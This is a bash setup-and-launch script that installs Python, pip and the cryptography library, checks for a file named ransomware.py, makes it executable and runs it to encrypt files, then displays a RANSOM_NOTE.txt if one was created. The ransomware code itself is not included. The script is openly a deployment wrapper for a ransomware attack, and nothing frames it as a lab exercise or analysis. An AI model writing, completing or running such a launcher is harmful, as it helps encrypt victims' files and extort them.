#!/bin/bash

# Step 1: Install dependencies

# Check if Python 3 is installed
if ! command -v python3 &> /dev/null; then
    echo "Python 3 is not installed. Installing Python 3..."
    sudo apt update
    sudo apt install -y python3
else
    echo "Python 3 is already installed."
fi

# Check if pip is installed
if ! command -v pip3 &> /dev/null; then
    echo "pip3 is not installed. Installing pip3..."
    sudo apt install -y python3-pip
else
    echo "pip3 is already installed."
fi

# Install required Python packages (cryptography)
echo "Installing required Python packages..."
pip3 install cryptography

# Step 2: Check if ransomware.py exists
if [[ ! -f "ransomware.py" ]]; then
    echo "Error: ransomware.py not found!"
    exit 1
fi

# Step 3: Make Python script executable (if needed)
chmod +x ransomware.py

# Step 4: Execute ransomware.py to encrypt files
echo "Executing ransomware.py to encrypt files..."
python3 ransomware.py

# Display the ransom note if created
if [[ -f "RANSOM_NOTE.txt" ]]; then
    echo "Ransom note:"
    cat RANSOM_NOTE.txt
else
    echo "Ransom note was not created."
fi

echo "Encryption process complete."
